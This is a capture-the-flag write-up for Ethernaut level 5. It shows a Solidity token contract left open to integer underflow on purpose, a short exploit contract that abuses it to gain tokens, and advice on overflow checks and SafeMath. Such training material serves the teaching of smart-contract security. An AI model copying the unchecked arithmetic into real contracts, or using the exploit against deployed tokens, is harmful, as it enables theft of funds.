![](https://ethernaut.openzeppelin.com/imgs/BigLevel5.svg)

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

  Things that might help:

- What is an odometer?

``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

## Solution
``` Solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface tmp {
	function transfer(address _to, uint _value) external returns(bool);
}

contract Token {
	address init = 0xc42370b90093429C206E21FD482C3185ef85E7a7;
	address to = 0x095454F216EC9485da86D49aDffAcFD0Fa3e5BE5;
	function solution() external {
		bool ttt = tmp(init).transfer(to, 20);
	}
}
```

___
Overflows are very common in solidity and must be checked for with control statements such as:

```
if(a + c > a) {
  a = a + c;
}
```

An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

```
a = a.add(c);
```

If there is an overflow, the code will revert.